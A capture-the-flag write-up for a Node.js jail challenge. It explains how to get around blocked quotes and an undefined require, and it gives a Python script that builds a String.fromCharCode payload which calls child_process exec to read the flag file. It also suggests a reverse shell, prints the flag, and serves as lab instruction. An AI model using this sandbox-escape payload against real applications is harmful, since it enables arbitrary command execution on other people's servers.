## Challenge Title: Battle of New York

## Category: Misc

TLDR

- is a node.js jail, where all forms of quotes are blocked, require and module are set to undefined
- escape out of the function and the comments
- retrieve the `require` object from the `global` object
- construct payload using `String.fromCharCode()`
- Either make reverse shell or just list out the directories

Python Script to construct payload:

```
def makeString(text):

    cmd = ""
    base = "String.fromCharCode("
    for i in text:
        cmd += base + str(ord(i))+")" + "+"
    cmd = cmd[:-1]

    x = "child_process"
    first_cmd = ""
    for i in x:
        first_cmd += base + str(ord(i))+")" + "+"
    first_cmd = first_cmd[:-1]

    final = "*/});(()=>{let x = global.process.mainModule.require;x(" + first_cmd + ").exec(" +cmd + ", function(err,stdout,stderr){console.log(stdout)});/*"
    print(final)

makeString("cat /home/node/flag.txt")
```

## Flag

```
GLUG{Hydr4_!5_4l!v3_<0__0>_848745426986bbc0}
```
